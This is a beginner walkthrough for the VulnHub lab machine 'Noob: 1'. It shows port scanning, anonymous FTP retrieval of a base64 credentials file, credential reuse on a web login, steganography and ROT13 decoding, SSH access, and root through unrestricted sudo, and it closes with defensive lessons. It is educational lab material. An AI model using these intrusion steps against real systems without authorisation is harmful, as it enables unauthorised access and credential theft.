# Noob: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Noob: 1 |
| **Difficulty** | Beginner |
| **Author** | VIEH Group |
| **Released** | 22 September 2021 |
| **VulnHub Entry** | [Noob: 1 on VulnHub](https://vulnhub.com/entry/noob-1,746/) |
| **Download** | [Noob.ova (3.1 GB)](https://download.vulnhub.com/noob/Noob.ova) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu-based; vsftpd 3.0.3, OpenSSH on a non-standard port) |

> MD5 of the official archive: `BC71D24EAA92D992AFC87194A7AF789F`. Verify it before importing.

---

## 0. What you will learn

This is a genuinely *beginner* box — no buffer overflows, no custom exploits. It teaches the core
habits of a pentest:

- **Port scanning**: spotting a service running on an unusual, high port.
- **Anonymous FTP**: downloading files from an FTP server that lets anyone in.
- **Decoding data**: recognising and reversing **base64**.
- **Web login attacks**: using leaked credentials against a login form.
- **Steganography**: hiding data inside images with `steghide`.
- **ROT13 / simple ciphers**: reading an obfuscated hint file.
- **`sudo` abuse**: using over-permissive `sudo` rights to become root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA/VM.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own lab address first:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

```bash
# ARP-scan the subnet — fast, uses ARP not TCP
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (use whatever *you* discover).

> **Why it works:** Every local host answers ARP even when it blocks pings, making ARP scanning the
> most reliable discovery method on a host-only lab network.

---

## 2. Enumeration

### 2.1 Full TCP sweep

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/noob-alltcp 192.168.56.101
```

> **How to read it:** The box hides SSH on a **non-standard port** (here `55077`). If you only scan
> the default ports you will miss it — always run `-p-`.

### 2.2 Service/version detection

```bash
sudo nmap -sC -sV -p 21,80,55077 -oA scans/noob-services 192.168.56.101
```

```text
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
55077/tcp open  ssh     OpenSSH 7.9p1 Ubuntu (protocol 2.0)
```

> **How to read it:** `vsftpd 3.0.3` on 21 is worth checking for **anonymous login**. SSH is on
> `55077` — remember that number. Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 Anonymous FTP

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: (press Enter)
# ftp> ls -la
```

```text
-rw-r--r--    1 0        0             20 cred.txt
```

```bash
# ftp> get cred.txt
# ftp> quit
cat cred.txt
```

```text
Y2hhbXA6cGFzc3dvcmQ=
```

> **Why it works:** The FTP server allows anonymous logins and someone left a credentials file
> (`cred.txt`) there. Even a "beginner" box rewards simply reading what is on offer.

### 2.4 Decode the credentials

That string is **base64**:

```bash
echo 'Y2hhbXA6cGFzc3dvcmQ=' | base64 -d ; echo
```

```text
champ:password
```

> **Why it works:** Base64 is an *encoding*, not encryption — anyone can decode it. Recognise the
> trailing `=` and the character set and you will decode most lab "secrets" instantly.

### 2.5 The website

```bash
curl -I http://192.168.56.101/
```

Browse to `http://192.168.56.101/` in a browser. You will find a simple login form. Use the
credentials we just decoded:

```text
Username: champ
Password: password
```

> **How to read it:** Reusing a credential found in one service against another is the entire point
> of this stage of the box.

Once logged in, the **"About"** page offers a downloadable archive:

```bash
wget http://192.168.56.101/<path>/downloads.rar
```

```text
Saving to: 'downloads.rar'
```

---

## 3. Foothold

### 3.1 Extract the archive

```bash
unrar x downloads.rar
ls -la
```

```text
funny.bmp
funny.jpg
sudo
```

> **How to read it:** "funny" pictures plus a file literally named `sudo` are a giant hint. Images
> are a classic carrier for **steganography**.

### 3.2 Steganography with steghide

Hiding data inside images is called **steganography**; `steghide` is the standard tool for it.

```bash
steghide extract -sf funny.jpg
```

```text
Enter passphrase:
wrote extracted data to "hint.py".
```

```bash
steghide extract -sf funny.bmp
```

```text
wrote extracted data to "user.txt".
```

> **Why it works:** The images carry hidden payloads. The passphrase may be **blank** (just press
> Enter) or set per build — try blank first. Contents "vary by build", so read whatever you extract.

```bash
cat user.txt
```

```text
<user flag — varies by build>
```

### 3.3 The hint

```bash
cat hint.py
```

```text
jgs:guvf bar vf n fvzcyr bar
```

That text is **ROT13** — each letter shifted 13 places. Decode it with `tr`:

```bash
echo 'jgs:guvf bar vf n fvzcyr bar' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

```text
wtf:this one is a simple one
```

> **How to read it:** `wtf` is a username and `this one is a simple one` is the password — a
> credential for SSH. `tr 'A-Za-z' 'N-ZA-Mn-za-m'` applies ROT13 in both directions.

![the extracted hint and user flag](images/05-stego.png)

---

## 4. Privilege escalation

### 4.1 SSH in as `wtf`

Remember SSH is on the non-standard port **55077**:

```bash
ssh wtf@192.168.56.101 -p 55077
# Password: this one is a simple one
```

```text
wtf@noob:~$
```

> **How to read it:** Because SSH was on `55077`, you must pass `-p 55077`. This is exactly why
> `nmap -p-` matters.

### 4.2 Check sudo rights

```bash
sudo -l
```

```text
User wtf may run the following commands on noob:
    (ALL : ALL) ALL
```

> **Why it works:** `wtf` has been granted **full sudo**. That is effectively root already — the
> box hands it to you.

```bash
sudo su
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 The root flag

```bash
cat /root/root.txt
```

```text
<base64-encoded root flag — varies by build>
```

> **Note:** The root flag is often base64-encoded. Decode it with
> `echo '<value>' | base64 -d ; echo` if it does not look like plain text. Flag names and contents
> differ between builds.

![root confirmation and flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP with a leaked credentials file | vsftpd 3.0.3, port 21 | Credential disclosure (`champ:password`) |
| 2 | Base64 used as if it were encryption | `cred.txt` | Trivially decoded secret |
| 3 | Credential reuse on the web login | Web app, port 80 | Account takeover → downloadable archive |
| 4 | Sensitive data hidden in images | `funny.jpg`, `funny.bmp` | Steganography leaks a hint and the user flag |
| 5 | SSH exposed on a high port | sshd, port 55077 | Obscurity (not security) — easily found with `-p-` |
| 6 | Over-permissive `sudo` (`(ALL : ALL) ALL`) | `wtf` user | Full privilege escalation to root |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and never store credentials on it. File servers must require
  authentication and enforce least privilege.
- **Do not treat encoding as security.** Base64, ROT13 and similar schemes offer zero protection;
  use a real secrets manager.
- **Never reuse credentials across services**, and store no plaintext secrets on the filesystem or
  in a web root.
- **Do not rely on non-standard ports for security.** "Security by obscurity" fails against a full
  port scan; expose SSH through a firewall/VPN, not a hidden port.
- **Least privilege for `sudo`.** Granting `(ALL : ALL) ALL` is equivalent to giving away root. Use
  specific, audited command allow-lists.
- **Monitor and log.** Alert on anonymous FTP logins, unexpected logins from new accounts, and
  `sudo` usage.

---

## 7. References

- [VulnHub official entry — Noob: 1](https://vulnhub.com/entry/noob-1,746/)
- [vsftpd — official project page](https://security.appspot.com/vsftpd.html)
- [GNU `tr` — Rot13 example (GNU Coreutils manual)](https://www.gnu.org/software/coreutils/manual/html_node/tr-invocation.html)
- [Steghide — steganography tool](https://steghide.sourceforge.net/)
- [Base64 encoding (RFC 4648)](https://datatracker.ietf.org/doc/html/rfc4648)

---

## 8. Screenshot checklist

- [ ] `images/01-recon-arp-scan.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap service scan (FTP, HTTP, SSH on 55077)
- [ ] `images/03-ftp-anon.png` — anonymous FTP and `cred.txt`
- [ ] `images/04-base64.png` — decoding the base64 credentials
- [ ] `images/05-stego.png` — `steghide` extraction + ROT13 hint
- [ ] `images/06-ssh-wtf.png` — SSH login as `wtf` on port 55077
- [ ] `images/07-sudo-l.png` — `sudo -l` showing `(ALL : ALL) ALL`
- [ ] `images/08-root-flag.png` — `id` as root and the root flag

> **How to read it:** Store screenshots in `labs/noob-1/images/` and reference them here with
> relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
